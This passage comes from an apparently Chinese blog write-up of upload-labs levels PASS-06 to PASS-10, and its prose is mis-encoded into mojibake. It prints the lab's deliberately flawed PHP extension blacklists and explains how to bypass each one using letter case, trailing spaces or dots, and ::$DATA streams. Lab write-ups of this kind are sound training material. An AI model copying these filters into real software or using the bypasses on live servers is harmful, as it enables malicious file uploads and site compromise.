class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ç‚¹ç©ºæ ¼ç‚¹çš„æ–¹æ³•ï¼Œè™½ç„¶èƒ½å¤ŸæˆåŠŸä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯å¹¶ä¸èƒ½è§£æå‡ºæ–‡ä»¶ååç¼€ï¼Œæ‰€ä»¥ä¸èƒ½åˆ©ç”¨<br><img src="https://img-blog.csdnimg.cn/ac74e3b6dc174b4fbaddebe36a317984.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¤§å°å†™ç»•è¿‡çš„æ–¹å¼è¿›è¡Œåˆ©ç”¨<br><img src="https://img-blog.csdnimg.cn/1fc77e2bc40d4170bc262c23bd4eb214.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/05c09ed1bbe04467bf64eb084f02601e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-07"><a href="#PASS-07" class="headerlink" title="PASS-07"></a>PASS-07</h2><p>æˆ‘ä»¬åœ¨åˆ†ææºç æ—¶å‘ç°ï¼Œå®ƒä¸ç¬¬äº”å…³çš„åŒºåˆ«æ˜¯æœ€åæ²¡æœ‰è¿›è¡Œé¦–å°¾å»ç©ºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶ååç¼€ä¸Šè¾“å…¥ç©ºæ ¼è¿›è¡Œç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨Windowsçš„ç‰¹æ€§ï¼Œåˆ›å»ºæ–‡ä»¶æ—¶ï¼Œä¼šå¿½ç•¥æ–‡ä»¶åç¼€ç©ºæ ¼ï¼Œä¿ç•™å®Œæ•´çš„æ–‡ä»¶åç¼€å<br><img src="https://img-blog.csdnimg.cn/fadef61abd584135acd24a42fca865a7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/7bf50ccb68a246118b0db2dd1cb882b6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-08"><a href="#PASS-08" class="headerlink" title="PASS-08"></a>PASS-08</h2><p>å’Œç¬¬äº”é¢˜çš„åŒºåˆ«æ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰åˆ é™¤å°¾ç«¯çš„ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè¿›è¡Œç»•è¿‡ï¼ŒåŸç†ä¹Ÿæ˜¯åˆ©ç”¨Windowså»é™¤å°¾ç«¯å°æ•°ç‚¹çš„ç‰¹æ€§è¿›è¡Œæ¼æ´åˆ©ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/5f39cc1b8cc44e82b541f528d067fadd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/c39fe120d3ed4ae795d36bb3ba3291e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-09"><a href="#PASS-09" class="headerlink" title="PASS-09"></a>PASS-09</h2><p>å’Œç¬¬äº”é¢˜çš„åŒºåˆ«æ˜¯ï¼Œä»£ç å¹¶æ²¡æœ‰è¿‡æ»¤æ‰<code>::$DATA</code>è¿™ä¸ªå­—ç¬¦ä¸²çš„åº”ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æµæ–‡ä»¶ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/4bd929fb704e47d6ad569b6b6f79e50c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/3c8ac218405c47bbb467e9801f924b8a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-10"><a href="#PASS-10" class="headerlink" title="PASS-10"></a>PASS-10</h2><p>æºç å’Œç¬¬äº”é¢˜ä¸€æ¨¡ä¸€æ ·ï¼Œåˆ©ç”¨è¿‡ç¨‹ç•¥è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span 